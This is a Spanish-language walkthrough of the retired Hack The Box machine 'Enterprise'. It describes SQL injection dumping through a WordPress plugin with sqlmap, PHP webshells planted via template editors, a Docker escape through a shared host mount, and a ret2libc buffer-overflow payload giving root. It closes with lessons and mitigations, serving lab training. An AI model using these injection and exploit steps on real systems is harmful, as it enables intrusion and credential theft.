---
machine: Enterprise
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, wordpress, joomla, docker, sqli, webshell, buffer-overflow, ret2libc, privesc]
---

# Enterprise — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

WordPress 4.8.1 usa el plugin `lcars`, cuyo `lcars_db.php?query=` es inyectable. Un volcado de `wp_posts` recupera contraseñas de un borrador y permite entrar en WordPress y, por reutilización, en el panel de Joomla de `8080`. En ambos contenedores se edita una plantilla PHP para obtener ejecución. El contenedor de Joomla monta un directorio del host, así que un webshell allí da shell en la máquina real. En el host, `xinetd` publica `/bin/lcars` en `32812`; tras el código de acceso, la opción 4 copia la entrada en un buffer de 212 bytes sin límites y permite un `ret2libc` hacia `system("/bin/sh")` como root.

## Reconocimiento

```bash
nmap -Pn -sCV -p22,80,443,8080,32812 <IP>
```

- `22`: OpenSSH 7.4p1 Ubuntu.
- `80`: Apache con WordPress 4.8.1.
- `443`: Apache por defecto.
- `8080`: Joomla.
- `32812`: servicio LCARS bajo `xinetd`.

```bash
echo '<IP> enterprise.htb' | sudo tee -a /etc/hosts
wpscan --url http://enterprise.htb --enumerate ap,us
```

## Enumeración

`wpscan` identifica el plugin `lcars`. Su archivo `lcars_db.php` pasa el parámetro `query` directamente a MySQL y es vulnerable a inyección error-based:

```bash
sqlmap -u 'http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1' --batch --dbs
sqlmap -u 'http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1' -D wordpress -T wp_posts --dump
```

El volcado de `wp_posts` incluye un borrador con varias contraseñas y nombres de usuario. `william.riker` entra en WordPress; `geordi.la.forge` y `Guinan` son cuentas de Joomla, y la contraseña de `geordi.la.forge` reutiliza una del borrador y tiene rol Super User.

## Foothold

En WordPress, **Appearance → Themes → Editor** permite modificar una plantilla. Se añade una webshell PHP y se visita una entrada con el parámetro que espera la webshell.

El resultado es una shell como `www-data` en un contenedor cuyo hostname es un ID de Docker.

En Joomla, el panel `/administrator` acepta las credenciales de `geordi.la.forge`. **Extensions → Templates → Templates** permite editar una plantilla; se inserta el mismo webshell y se visita una ruta inexistente con el parámetro que espera.

## Movimiento lateral

El contenedor de Joomla tiene montado un directorio del host, `/var/www/html/files`. Un archivo PHP escrito desde el contenedor aparece en el host y se ejecuta desde el sitio principal:

`http://enterprise.htb/files/shell.php`

Así se obtiene una shell como `www-data` en el host `enterprise`, fuera de Docker.

## Escalada de privilegios

`ps`/`pstree` muestra que `xinetd` lanza `/bin/lcars` al conectar a `32812`. El binario pide un código de acceso (`picarda1`), muestra un menú y la opción 4 solicita un "Security Override" que se copia en un buffer de 212 bytes.

Con el binario y la libc del sistema se calculan los desplazamientos y se construye un `ret2libc`:

```python
from pwn import *
system = p32(<SYSTEM>)
exit_ = p32(<EXIT>)
sh = p32(<BINSH>)
payload = b"A" * 212 + system + exit_ + sh
```

```text
Enter Bridge Access Code: picarda1
Waiting for input: 4
Enter Security Override: <payload>
```

El retorno a `system("/bin/sh")` devuelve una shell como root.

## Evidencia

- `lcars_db.php?query=` inyectable y volcado de `wp_posts` con credenciales.
- Acceso a WordPress y a Joomla con cuentas del borrador.
- Plantillas editadas y webshell en ambos contenedores.
- Directorio montado y shell en el host `enterprise`.
- `/bin/lcars` bajo `xinetd`, opción 4 y `ret2libc` con shell de root.

## Lecciones aprendidas

- Un plugin con SQLi expone toda la base de datos y los borradores.
- La reutilización de contraseñas une WordPress y Joomla.
- El editor de plantillas es ejecución de código si se compromete un administrador.
- Un volumen compartido entre contenedor y host rompe el aislamiento.
- Los servicios `xinetd` antiguos pueden ocultar binarios vulnerables.
- Un buffer fijo sin comprobación de longitud permite controlar el retorno.

## Mitigaciones y detección

- Actualizar WordPress, plugins y Joomla; retirar componentes sin soporte.
- Parametrizar consultas y revisar plugins personalizados.
- Limitar el editor de plantillas y aplicar MFA a los administradores.
- No montar directorios del host en contenedores web; usar volúmenes mínimos.
- Compilar con `-fstack-protector`, ASLR y `NX`, y revisar servicios heredados.
- Monitorizar escrituras en el directorio montado y ejecuciones de `/bin/lcars`.

## Referencias

- [0xdf — Enterprise](https://0xdf.gitlab.io/2021/06/16/htb-enterprise.html)
- [Hack The Box — Enterprise](https://app.hackthebox.com/machines/enterprise)
